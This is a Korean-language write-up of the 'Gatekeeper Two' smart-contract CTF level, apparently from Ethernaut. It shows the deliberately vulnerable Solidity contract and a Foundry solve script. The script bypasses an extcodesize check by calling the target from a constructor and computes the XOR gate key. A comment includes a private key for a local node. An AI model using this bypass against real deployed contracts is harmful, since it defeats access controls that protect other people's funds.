# 지문

이 문지기는 몇 가지 새로운 도전을 제시합니다. 참가자로 등록하면 이 레벨을 통과할 수 있습니다.

도움이 될 만한 것들:

* 첫 번째 Gatekeeper를 통과하며 배운 내용을 떠올리세요 — 첫 번째 게이트는 동일합니다.
* 두 번째 게이트의 `assembly` 키워드는 순수 Solidity에 기본 제공되지 않는 기능에 접근할 수 있게 해줍니다. 자세한 내용은 Solidity Assembly 문서를 참고하세요. 이 게이트에서 사용되는 `extcodesize` 호출은 특정 주소에 배포된 컨트랙트 코드의 크기를 가져옵니다 — 이 값이 언제, 어떻게 설정되는지는 이더리움 옐로 페이퍼의 섹션 7에서 확인할 수 있습니다.
* 세 번째 게이트의 `^` 문자는 비트 단위 연산(XOR)이며, 여기서는 또 다른 흔한 비트 연산을 적용하는 데 사용됩니다(솔리디티 치트시트 참고). 이 챌린지에 접근할 때는 Coin Flip 레벨도 좋은 출발점입니다.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

# 풀이 

`gateOne`과 `gateThree` modifier는 상대적으로 간단함.
하지만 `gateOne`과 `gateTwo`의 조건이 상충되는것으로 보일텐데 `extcodesize`의 맹점은 contract의 constructor 실행 시점에서 항상 0을 반환한다는것임.

그점을 이용하면 쉽게 해결 할 수 있음 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function enter(bytes8) external returns (bool);
    function entrant() external view returns (address);
}

contract Helper {
    constructor(address target) public {
        bytes8 answer = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        ITarget(target).enter(answer);
    }
}
contract SolveScript is Script {
    address public target = 0x8dAF17A20c9DBA35f005b6324F493785D239719d;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("entrant address : %s", ITarget(target).entrant());
        Helper helper = new Helper(target);
        console.log("entrant address after poc : %s", ITarget(target).entrant());
        vm.stopBroadcast();
    }
}

```